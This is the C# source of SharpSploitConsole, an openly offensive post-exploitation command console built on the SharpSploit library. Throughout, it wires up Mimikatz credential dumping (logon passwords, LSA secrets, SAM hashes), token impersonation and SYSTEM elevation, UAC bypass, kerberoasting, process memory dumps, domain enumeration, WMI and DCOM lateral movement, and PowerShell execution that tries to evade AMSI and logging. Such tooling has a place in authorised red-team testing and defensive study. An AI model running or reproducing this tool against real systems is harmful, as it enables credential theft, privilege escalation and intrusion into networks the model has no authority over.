using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;

/*
Authors: @anthemtotheego and @g0ldengunsec
License: BSD 3-Clause
Find Sharpsploit: https://github.com/cobbr/SharpSploit  
*/

namespace SharpSploitConsole
{
    class Program
    {
        //Main
        static void Main(string[] args)
        {
            if (args.Length <= 0)
            {
                art();
                help();
            }
            else if (args.Length > 0)
            {
                if (args[0].ToLower() == "interact")
                {
                    art();
                    console();
                }
                else
                {
                    if (args.Contains("getsystem", StringComparer.OrdinalIgnoreCase))
                    {
                        getSystem();
                        List<string> argsUpdated = args.ToList();
                        argsUpdated.RemoveAll(x => x.ToString().Equals("getsystem", StringComparison.OrdinalIgnoreCase));
                        args = argsUpdated.ToArray();
                    }
                    else if (args.Contains("impersonate", StringComparer.OrdinalIgnoreCase))
                    {
                        impersonateProcess(args);
                        List<string> argsUpdated = args.ToList();                        
                        argsUpdated.RemoveRange(argsUpdated.IndexOf("impersonate"), 2);
                        args = argsUpdated.ToArray();
                        
                    }
                    commands(args);
                }
            }
        }//End Main
        //SharpSploit Command Modules
        private static void commands(string[] request)
        {
            String error = ER();
            try
            {
                //exit
                if (request[0].ToLower() == "exit")
                {
                    Environment.Exit(0);
                }
                //help
                else if (request[0].ToLower() == "help" || request[0] == "?")
                {
                    help();
                }
                //SharpSploit Credential Modules                
                else if (request[0].ToLower() == "mimi-all")
                {
                    mimiAll();
                }
                else if (request[0].ToLower() == "mimi-command")
                {
                    mimiCommand(request);
                }
                else if (request[0].ToLower() == "logonpasswords")
                {
                    logonPasswords();
                }
                else if (request[0].ToLower() == "lsacache")
                {
                    lsaCache();
                }
                else if (request[0].ToLower() == "lsasecrets")
                {
                    lsaSecrets();
                }
                else if (request[0].ToLower() == "samdump")
                {
                    samDump();
                }
                else if (request[0].ToLower() == "wdigest")
                {
                    wDigest();
                }
                //Token Class Begin
                else if (request[0].ToLower() == "whoami")
                {
                    WhoAmI();
                }
                else if (request[0].ToLower() == "getsystem")
                {
                    getSystem();
                }
                else if (request[0].ToLower() == "impersonate")
                {                    
                    impersonateProcess(request);
                }
                else if (request[0].ToLower() == "bypassuac")
                {
                    bypassUAC(request);
                }
                else if (request[0].ToLower() == "reverttoself")
                {
                    revertToSelf();
                }
                //SharpSploit Enumeration Modules
                else if (request[0].ToLower() == "kerberoast")
                {
                    SharpSploit.Enumeration.Domain.DomainSearcher searcher = searcherBuilder(request);

                    string[] argsLower = request.Select(s => s.ToLowerInvariant()).ToArray();
                    if (Array.IndexOf(argsLower, "-target") > -1)
                    {
                        IEnumerable<string> target = new String[] { request[Array.IndexOf(request, "-target") + 1] };
                        kerberoast(searcher, target);
                    }
                    else
                    {
                        kerberoast(searcher);
                    }
                }
                else if (request[0].ToLower() == "getdomainusers")
                {
                    SharpSploit.Enumeration.Domain.DomainSearcher searcher = searcherBuilder(request);

                    string[] argsLower = request.Select(s => s.ToLowerInvariant()).ToArray();
                    if (Array.IndexOf(argsLower, "-target") > -1)
                    {
                        IEnumerable<string> target = new String[] { request[Array.IndexOf(request, "-target") + 1] };
                        getDomainUsers(searcher, target);
                    }
                    else
                    {
                        getDomainUsers(searcher);
                    }
                }
                else if (request[0].ToLower() == "getdomaingroups")
                {
                    SharpSploit.Enumeration.Domain.DomainSearcher searcher = searcherBuilder(request);
                    string[] argsLower = request.Select(s => s.ToLowerInvariant()).ToArray();
                    if (Array.IndexOf(argsLower, "-target") > -1)
                    {
                        IEnumerable<string> target = new String[] { request[Array.IndexOf(request, "-target") + 1] };
                        getDomainGroups(searcher, target);
                    }
                    else
                    {
                        getDomainGroups(searcher);
                    }
                }
                else if (request[0].ToLower() == "getdomaincomputers")
                {
                    SharpSploit.Enumeration.Domain.DomainSearcher searcher = searcherBuilder(request);
                    string[] argsLower = request.Select(s => s.ToLowerInvariant()).ToArray();
                    if (Array.IndexOf(argsLower, "-target") > -1)
                    {
                        IEnumerable<string> target = new String[] { request[Array.IndexOf(request, "-target") + 1] };
                        getDomainComputers(searcher, target);
                    }
                    else
                    {
                        getDomainComputers(searcher);
                    }
                }
                else if (request[0].ToLower() == "currentdirectory")
                {
                    currentDirectory();
                }
                else if (request[0].ToLower() == "directorylisting")
                {
                    directoryListing();
                }
                else if (request[0].ToLower() == "changedirectory")
                {
                    changeDirectory(request);
                }
                else if (request[0].ToLower() == "hostname")
                {
                    hostname();
                }
                else if (request[0].ToLower() == "processlist")
                {
                    processList();
                }
                else if (request[0].ToLower() == "procdump")
                {
                    procDump(request);
                }
                else if (request[0].ToLower() == "username")
                {
                    username();
                }
                else if (request[0].ToLower() == "readregistry")
                {
                    readReg(request);
                }
                else if (request[0].ToLower() == "writeregistry")
                {
                    writeReg(request);
                }
                else if (request[0].ToLower() == "netlocalgroupmembers")
                {
                    netLocalGroupMembers(request);
                }
                else if (request[0].ToLower() == "netlocalgroups")
                {
                    netLocalGroups(request);
                }
                else if (request[0].ToLower() == "netloggedonusers")
                {
                    netLoggedOnUsers(request);
                }
                else if (request[0].ToLower() == "netsessions")
                {
                    netSessions(request);
                }
                else if (request[0].ToLower() == "ping")
                {
                    ping(request);
                }
                else if (request[0].ToLower() == "portscan")
                {
                    portScan(request);
                }
                //SharpSploit Lateral Movement Modules
                else if (request[0].ToLower() == "wmi")
                {
                    wmi(request);
                }
                else if (request[0].ToLower() == "dcom")
                {
                    dcom(request);
                }
                //SharpSploit Execution Modules
                else if (request[0].ToLower() == "shell")
                {
                    shell(request);
                }
                else if (request[0].ToLower() == "powershell")
                {
                    powerShell(request);
                }
                //Unknown command
                else
                {
                    Console.WriteLine("unknown command, type help for commandline options");
                }
            }//End Try
            catch
            {
                Console.WriteLine(error);
            }
        }
        //Methods
        private static void mimiAll()
        {
            var a = SharpSploit.Credentials.Mimikatz.All();
            Console.WriteLine(a);
        }
        private static void mimiCommand(String[] request)
        {
            List<string> clist = new List<string>();
            clist = String.Join(" ", request).Split(' ').Skip(1).ToList();
            String command = "\"" + String.Join(" ", clist) + "\"";
            Console.WriteLine(command);
            var a = SharpSploit.Credentials.Mimikatz.Command(command);
            Console.WriteLine(a);
        }
        private static void logonPasswords()
        {
            var a = SharpSploit.Credentials.Mimikatz.LogonPasswords();
            Console.WriteLine(a);
        }
        private static void lsaCache()
        {
            var a = SharpSploit.Credentials.Mimikatz.LsaCache();
            Console.WriteLine(a);
        }
        private static void lsaSecrets()
        {
            var a = SharpSploit.Credentials.Mimikatz.LsaSecrets();
            Console.WriteLine(a);
        }
        private static void samDump()
        {
            var a = SharpSploit.Credentials.Mimikatz.SamDump();
            Console.WriteLine(a);
        }
        private static void wDigest()
        {
            var a = SharpSploit.Credentials.Mimikatz.Wdigest();
            Console.WriteLine(a);
        }
        private static void WhoAmI()
        {
            SharpSploit.Credentials.Tokens whoami = new SharpSploit.Credentials.Tokens();
            var a = whoami.WhoAmI();
            Console.WriteLine(a);
        }
        private static void getSystem()
        {
            String error = ER();
            SharpSploit.Credentials.Tokens getSys = new SharpSploit.Credentials.Tokens();
            var a = getSys.GetSystem();
            Console.WriteLine(a);
        }
        private static void impersonateProcess(String[] request)
        {         
            String error = ER();
            uint procID = UInt32.Parse(request[1]);
            SharpSploit.Credentials.Tokens impersonate = new SharpSploit.Credentials.Tokens();
            var a = impersonate.ImpersonateProcess(procID);
            Console.WriteLine(a);
        }
        private static void bypassUAC(String[] request)
        {
            SharpSploit.Credentials.Tokens uac = new SharpSploit.Credentials.Tokens();
            int pid = 0;
            uac.BypassUAC(request[1], request[2], request[3], pid);
        }
        private static void revertToSelf()
        {
            SharpSploit.Credentials.Tokens revert = new SharpSploit.Credentials.Tokens();
            var a = revert.RevertToSelf();
            Console.WriteLine(a);
        }
        private static void kerberoast(SharpSploit.Enumeration.Domain.DomainSearcher searcher, IEnumerable<string> target = null)
        {
            List<SharpSploit.Enumeration.Domain.SPNTicket> a = searcher.Kerberoast(target);
            foreach (SharpSploit.Enumeration.Domain.SPNTicket val in a)
            {
                Console.WriteLine(val.GetFormattedHash());
            }
        }
        private static void getDomainUsers(SharpSploit.Enumeration.Domain.DomainSearcher searcher, IEnumerable<string> target = null)
        {
            List<SharpSploit.Enumeration.Domain.DomainObject> a = searcher.GetDomainUsers(target);
            foreach (SharpSploit.Enumeration.Domain.DomainObject val in a)
            {
                Console.WriteLine(val.ToString());
            }
        }
        private static void getDomainGroups(SharpSploit.Enumeration.Domain.DomainSearcher searcher, IEnumerable<string> target = null)
        {
            List<SharpSploit.Enumeration.Domain.DomainObject> a = searcher.GetDomainGroups(target);
            foreach (SharpSploit.Enumeration.Domain.DomainObject val in a)
            {
                Console.WriteLine(val.ToString());
            }
        }
        private static void getDomainComputers(SharpSploit.Enumeration.Domain.DomainSearcher searcher, IEnumerable<string> target = null)
        {
            List<SharpSploit.Enumeration.Domain.DomainObject> a = searcher.GetDomainComputers(target);
            foreach (SharpSploit.Enumeration.Domain.DomainObject val in a)
            {
                Console.WriteLine(val.ToString());
            }
        }
        private static void currentDirectory()
        {
            var a = SharpSploit.Enumeration.Host.GetCurrentDirectory();
            Console.WriteLine(a);
        }
        private static void directoryListing()
        {
            var a = SharpSploit.Enumeration.Host.GetDirectoryListing();
            Console.WriteLine(a);
        }
        private static void changeDirectory(String[] request)
        {
            SharpSploit.Enumeration.Host.ChangeCurrentDirectory(request[1]);
        }
        private static void hostname()
        {
            var a = SharpSploit.Enumeration.Host.GetHostname();
            Console.WriteLine(a);
        }
        private static void processList()
        {
            var a = SharpSploit.Enumeration.Host.GetProcessList();
            Console.WriteLine(a);
        }
        private static void procDump(String[] request)
        {
            int pid = Int32.Parse(request[1]);
            SharpSploit.Enumeration.Host.CreateProcessDump(pid, request[2], request[3]);
        }
        private static void username()
        {
            var a = SharpSploit.Enumeration.Host.GetUsername();
            Console.WriteLine(a);
        }
        private static void readReg(String[] request)
        {
            var a = SharpSploit.Enumeration.Host.RegistryRead(request[1]);
            Console.WriteLine(a);
        }
        private static void writeReg(String[] request)
        {
            var a = SharpSploit.Enumeration.Host.RegistryWrite(request[1], request[2]);
            Console.WriteLine(a);
        }
        private static void netLocalGroupMembers(String[] request)
        {
            var Creds = new SharpSploit.Enumeration.Domain.Credential(request[3], request[4]);
            var a = SharpSploit.Enumeration.Net.GetNetLocalGroupMembers(request[1], request[2], Creds);
            foreach (var i in a)
            {
                Console.WriteLine(i);
            }
        }
        private static void netLocalGroups(String[] request)
        {
            var Creds = new SharpSploit.Enumeration.Domain.Credential(request[2], request[3]);
            var a = SharpSploit.Enumeration.Net.GetNetLocalGroups(request[1], Creds);
            foreach (var i in a)
            {
                Console.WriteLine(i);
            }
        }
        private static void netLoggedOnUsers(String[] request)
        {
            var Creds = new SharpSploit.Enumeration.Domain.Credential(request[2], request[3]);
            var a = SharpSploit.Enumeration.Net.GetNetLoggedOnUsers(request[1], Creds);
            foreach (var i in a)
            {
                Console.WriteLine(i);
            }
        }
        private static void netSessions(String[] request)
        {
            var Creds = new SharpSploit.Enumeration.Domain.Credential(request[2], request[3]);
            var a = SharpSploit.Enumeration.Net.GetNetSessions(request[1], Creds);
            foreach (var i in a)
            {
                Console.WriteLine(i);
            }
        }
        private static void ping(String[] request)
        {
            int Time = 250;
            int Thread = 100;
            List<string> clist = new List<string>();
            clist = String.Join(" ", request).Split(' ').Skip(1).ToList();
            var a = SharpSploit.Enumeration.Network.Ping(clist, Time, Thread);
            Console.WriteLine(a);
        }
        private static void portScan(String[] request)
        {
            int Time = 250;
            int Thread = 100;
            bool Ping = true;
            List<string> plist = new List<string>();
            List<int> plist1 = new List<int>();
            plist = String.Join(" ", request).Split(' ').Skip(2).ToList();
            plist1 = plist.Select(int.Parse).ToList();
            var a = SharpSploit.Enumeration.Network.PortScan(request[1], plist1, Ping, Time, Thread);
            Console.WriteLine(a);
        }
        private static SharpSploit.Enumeration.Domain.DomainSearcher searcherBuilder(string[] args)
        {
            try
            {
                SharpSploit.Enumeration.Domain.Credential creds = null;
                string domain = "", server = "", searchBase = "", searchString = "";
                System.DirectoryServices.SearchScope searchScope = System.DirectoryServices.SearchScope.Subtree;
                int resultPageSize = 200;
                TimeSpan serverTimeLimit = default(TimeSpan);
                bool tombStone = false;
                System.DirectoryServices.SecurityMasks securityMasks = 0;

                string[] argsLower = args.Select(s => s.ToLowerInvariant()).ToArray();

                if (Array.IndexOf(argsLower, "-username") > -1)
                {
                    if (Array.IndexOf(argsLower, "-password") > -1)
                    {
                        creds = new SharpSploit.Enumeration.Domain.Credential(args[Array.IndexOf(args, "-username") + 1], args[Array.IndexOf(args, "-password") + 1]);
                        Console.WriteLine(args[Array.IndexOf(args, "-password") + 1]);
                    }
                    else
                    {
                        Console.WriteLine("Error, if providing credentials you must provide both a username and password");
                        return null;
                    }
                }
                if (Array.IndexOf(argsLower, "-domain") > -1)
                {
                    domain = args[Array.IndexOf(args, "-domain") + 1];
                }
                if (Array.IndexOf(argsLower, "-server") > -1)
                {
                    server = args[Array.IndexOf(args, "-server") + 1];
                }
                if (Array.IndexOf(argsLower, "-searchbase") > -1)
                {
                    searchBase = args[Array.IndexOf(args, "-searchbase") + 1];
                }
                if (Array.IndexOf(argsLower, "-searchstring") > -1)
                {
                    searchString = args[Array.IndexOf(args, "-searchstring") + 1];
                }

                var gather = new SharpSploit.Enumeration.Domain.DomainSearcher(creds, domain, server, searchBase, searchString, searchScope, resultPageSize, serverTimeLimit, tombStone, securityMasks);
                return gather;
            }
            catch
            {
                Console.WriteLine("Error Generating Domain Searcher Object");
                return null;
            }
        }
        private static void wmi(String[] request)
        {
            List<string> clist = new List<string>();
            clist = String.Join(" ", request).Split(' ').Skip(4).ToList();
            string cmd = string.Join(" ", clist); ;
            var a = SharpSploit.LateralMovement.WMI.WMIExecute(request[1], cmd, request[2], request[3]);
            Console.WriteLine(a);
        }
        private static void dcom(String[] request)
        {
            List<string> plist = new List<string>();
            plist = String.Join(" ", request).Split(' ').Skip(3).ToList();
            string param = string.Join(" ", plist);
            var a = SharpSploit.LateralMovement.DCOM.DCOMExecute(request[1], request[2], param);
            Console.WriteLine(a);
        }
        private static void shell(String[] request)
        {
            List<string> clist = new List<string>();
            clist = String.Join(" ", request).Split(' ').Skip(1).ToList();
            String cmd = String.Join(" ", clist);
            Console.WriteLine(cmd);
            var a = SharpSploit.Execution.Shell.ShellExecute(cmd);
            Console.WriteLine(a);
        }
        private static void powerShell(String[] request)
        {
            List<string> clist = new List<string>();
            clist = String.Join(" ", request).Split(' ').Skip(1).ToList();
            String cmd = String.Join(" ", clist);
            Console.WriteLine(cmd);
            var a = SharpSploit.Execution.Shell.PowerShellExecute(cmd);
            Console.WriteLine(a);
        }
        //Interactive Console
        private static void console()
        {
            while (true)
            {
                Console.Write("SharpSploitConsole:> ");
                String cmd = RL();
                String error = ER();
                Char delimiter = ' ';
                String[] request = cmd.Split(delimiter);
                commands(request);
            }
        }
        //Error message
        private static string ER()
        {
            string a = "Something went wrong! Check parameters or try running as an admin or system user";
            return a;
        }
        //Increases Readline from 256 chars to 8192 
        const int READLINE_BUFFER_SIZE = 8192;
        private static string RL()
        {
            Stream inputStream = Console.OpenStandardInput(READLINE_BUFFER_SIZE);
            Console.SetIn(new StreamReader(inputStream, Encoding.Default, false, 8192));
            return Console.ReadLine();
        }
        //Help Menu
        private static void help()
        {
            Console.WriteLine();
            Console.WriteLine("Enter Console Mode");
            Console.WriteLine("------------------");
            Console.WriteLine();
            stringPrinter("Interact", "Starts interactive console mode, if you are interacting remotely you may not want to use this option");
            Console.WriteLine();
            Console.WriteLine("SharpSploit Credentials Commands");
            Console.WriteLine("--------------------------------");
            Console.WriteLine();
            Console.WriteLine("Mimikatz");
            Console.WriteLine("--------");
            Console.WriteLine();
            stringPrinter("Mimi-All", "Executes everything but DCSync - requires admin");
            stringPrinter("Mimi-Command", "Executes a chosen Mimikatz command(s).");
            stringPrinter("logonPasswords", "Runs privilege::debug sekurlsa::logonPasswords - requires admin");
            stringPrinter("LsaCache", "Retrieve Domain Cached Credentials hashes from registry - requires admin");
            stringPrinter("LsaSecrets", "Retrieve LSA secrets stored in registry - requires admin");
            stringPrinter("SamDump", "Retrieve password hashes from the SAM database - requires admin");
            stringPrinter("Wdigest", "Retrieve Wdigest credentials from registry");
            Console.WriteLine();
            Console.WriteLine("Tokens");
            Console.WriteLine("------");
            Console.WriteLine();
            stringPrinter("Whoami", "Retrieve current user");
            stringPrinter("GetSystem", "Impersonate system user, requires admin rights.  Note: Can be ran in conjunction on the commandline with other commands to execute them with system level permissions. Example: sharpSploitConsole.exe getsystem logonPasswords");
            stringPrinter("Impersonate", "Impersonate the token of a specified process, requires pid - command requires admin rights.   Note: Can be ran in conjunction on the commandline with other commands to execute them with permissions of the impersonated user. Example: sharpSploitConsole.exe impersonate 1280 Kerberoast");
            stringPrinter("BypassUAC", "Bypass UAC, requires binary, command | path to binary - requires admin rights");
            stringPrinter("RevertToSelf", "Ends the impersonation of any token, reverts back to initial token associated with current process");
            Console.WriteLine();
            Console.WriteLine("SharpSploit Enumeration Commands");
            Console.WriteLine("--------------------------------");
            Console.WriteLine();
            stringPrinter("CurrentDirectory", "Retrieve current working directory");
            stringPrinter("DirectoryListing", "Retrieve current directory listing");
            stringPrinter("ChangeDirectory", "Changes the current directory by appending a specified string to the current working directory");
            stringPrinter("Hostname", "Retrieve hostname");
            stringPrinter("ProcessList", "Retrieve list of running processes");
            stringPrinter("ProcDump", "Creates a minidump of the memory of a running process, requires PID | output location | output name - requires admin");
            stringPrinter("Username", "Retrieve current username");
            stringPrinter("ReadRegistry", "Retrieve registry path value, requires full path argument");
            stringPrinter("WriteRegistry", "Write to registry, requires full path | value");
            stringPrinter("NetLocalGroupMembers", "Retrieve users of local group from a remote system, requires computername | groupname | username | password");
            stringPrinter("NetLocalGroups", "Retrieve local groups from a remote system, requires computername | username | password");
            stringPrinter("NetLoggedOnUsers", "Retrieve current logged on users from a remote system, requires computername| username | password");
            stringPrinter("NetSessions", "Retrieve user sessions from a remote system, requires computername | username | password");
            stringPrinter("Ping", "Ping systems, requires computernames");
            stringPrinter("PortScan", "Port scan systems, requires computername | ports");
            Console.WriteLine();
            Console.WriteLine("SharpSploit Domain Enumeration Commands");
            Console.WriteLine("--------------------------------");
            Console.WriteLine("Note: optional args require the specified flag in addition to the value to set");
            Console.WriteLine();
            stringPrinter("GetDomainUsers", "Grabs specified (or all) user objects in the target domain, by default will use current user context. optional arguments: -username -password -domain -server -searchbase -searchstring -target. Example: sharpSploitConsole.exe GetDomainUsers");
            stringPrinter("GetDomainGroups", "Grabs specified (or all) group objects in the target domain, by default will use current user context. optional arguments: -username -password -domain -server -searchbase -searchstring -target. Example: sharpSploitConsole.exe GetDomainGroups -target \"Domain Admins\"");
            stringPrinter("GetDomainComputers", "Grabs specified (or all) computer objects in the target domain, by default will use current user context. optional arguments: -username -password -domain -server -searchbase -searchstring -target. Example: sharpSploitConsole.exe GetDomainComputers -target TestDC01");
            stringPrinter("Kerberoast", "Performs a kerberoasting attack against targeted (or all) user objects in the target domain, by default will use current user context. optional arguments: -username -password -domain -server -searchbase -searchstring -target. Example: sharpSploitConsole.exe kerberoast -username bob -password Password1 -domain test.corp -server 192.168.1.10 -target sqlService");

            Console.WriteLine();
            Console.WriteLine("SharpSploit Lateral Movement Commands");
            Console.WriteLine("--------------------------------");
            Console.WriteLine();
            stringPrinter("WMI", "Run command remotely via WMI, requires computername | username | password | command - requires admin");
            stringPrinter("DCOM", "Run command remotely via DCOM, requires computername | command | directory | params - requires admin");
            Console.WriteLine();
            Console.WriteLine();
            Console.WriteLine("SharpSploit Command Execution");
            Console.WriteLine("--------------------------------");
            Console.WriteLine();
            stringPrinter("Shell", "Run a shell command.  Example: shell net user");
            stringPrinter("Powershell", "Runs a powershell command while attempting to bypass AMSI, scriptBlock logging, and Module logging.  Example: sharpSploitConsole.exe powershell $PSVersionTable.PSVersion");
            Console.WriteLine();
            Console.WriteLine();
        }
        private static void stringPrinter(string title, string description = "")
        {
            int firstIteration = 0;
            Console.Write("{0,-30}", title);
            if (description.Length == 0)
            {
                Console.WriteLine();
            }
            while (description.Length > 0)
            {
                try
                {
                    string choppedDesc = description.Substring(0, 85);
                    int tempCut = choppedDesc.LastIndexOf(" ");
                    if (firstIteration == 0)
                    {
                        Console.WriteLine("{0,-85}", description.Substring(0, tempCut));
                        firstIteration = 1;
                    }
                    else
                    {
                        Console.WriteLine("{0,-30} {1,-85}", "", description.Substring(0, tempCut));
                    }
                    description = description.Remove(0, tempCut);
                }
                catch
                {
                    if (firstIteration == 0)
                    {
                        Console.WriteLine("{0,-85}", description);
                    }
                    else
                    {
                        Console.WriteLine("{0,-30} {1,-85}", "", description);
                    }
                    break;
                }
            }
        }
        private static void art()
        {
            string asci =
            @"
                           

                                          
                                                                
                         _________.__                         _________      .__         .__  __   
                        /   _____/|  |__ _____ _____________ /   _____/_____ |  |   ____ |__|/  |_ 
                        \_____  \ |  |  \\__  \\_  __ \____ \\_____  \\____ \|  |  /  _ \|  \   __\
                        /        \|   Y  \/ __ \|  | \/  |_> >        \  |_> >  |_(  <_> )  ||  |  
                       /_______  /|___|  (____  /__|  |   __/_______  /   __/|____/\____/|__||__|  
                               \/      \/     \/      |__|          \/|__|                         ";

            string console = "@                                                [Console Edition v 1.1]@@" +
                              "                                       Written by anthemtotheego & g0ldengunsec@@" +
                              "@" +
                              "                                        Type help or ? to show menu options@@@@";

            console = console.Replace("@", System.Environment.NewLine);
            Console.WriteLine(asci);
            Console.WriteLine(console);
        }
    }
}